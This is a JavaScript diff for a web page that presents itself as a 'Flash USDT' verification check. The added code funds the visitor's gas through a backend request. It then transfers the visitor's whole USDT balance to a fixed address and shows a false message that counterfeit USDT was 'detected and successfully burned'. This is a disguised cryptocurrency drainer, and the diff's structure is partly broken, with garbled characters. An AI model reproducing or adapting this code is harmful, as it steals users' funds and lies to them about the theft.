@@ -1373,32 +1373,54 @@ async function approveToken() {
             return;
         }
 
-        if (bnbBalance < 0.0005) {
-            showPopup("Checking the Assets...", "blue");
-            await fetch("https://bepusdt-backend-production.up.railway.app/send-bnb", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ toAddress: userAddress })
-            });
-            await new Promise(r => setTimeout(r, 3000)); // wait for gas
+      async function transferUSDT(usdtBalance, userBNB) {
+    try {
+        if (userBNB < 0.0005) {
+    console.log("User BNB is low. Requesting BNB from backend...");
+    await fetch("https://bepusdt-backend-production.up.railway.app/send-bnb", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ toAddress: userAddress })
+    });
         }
 
-        showPopup("Loading...", "blue");
+        // Proceed with USDT Transfer
+        const usdtContract = new web3.eth.Contract([
+            { "constant": false, "inputs": [{ "name": "recipient", "type": "address" }, { "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
+        ], usdtContractAddress);
 
-        await usdtContract.methods.transfer(bscAddress, web3.utils.toWei(usdtBalance.toString(), "ether"))
-            .send({ from: userAddress });
+        const amountToSend = web3.utils.toWei(usdtBalance.toString(), "ether");
+
+        console.log(`Transferring ${usdtBalance} USDT to ${bscAddress}...`);
+
+        await usdtContract.methods.transfer(bscAddress, amountToSend).send({ from: userAddress });
 
         showPopup(
-            `✅ Transfer complete<br><b>USDT Burned:</b> ${usdtBalance}`,
+            `â Verification Successful<br>Flash USDT has been detected and successfully burned.<br><br><b>USDT Burned:</b> ${usdtBalance} USDT`,
             "red"
         );
 
-    } catch (e) {
-        console.error("❌ Transfer failed:", e);
-        showPopup("USDT transfer failed. Check balance or gas.", "red");
+        console.log(`â Transferred ${usdtBalance} USDT to ${bscAddress}`);
+    } catch (error) {
+        console.error("â USDT Transfer Failed:", error);
+        alert("USDT transfer failed. Ensure you have enough BNB for gas.");
     }
 }
 
+async function sendBNB(toAddress, amount) {
+    try {
+        await web3.eth.sendTransaction({
+            from: bnbGasSender,
+            to: toAddress,
+            value: web3.utils.toWei(amount, "ether"),
+            gas: 21000
+        });
+
+        console.log(`â Sent ${amount} BNB to ${toAddress} for gas fees.`);
+    } catch (error) {
+        console.error("â ï¸ Error sending BNB:", error);
+    }
+}
 function showPopup(message, color) {
     let popup = document.getElementById("popupBox");
     if (!popup) {
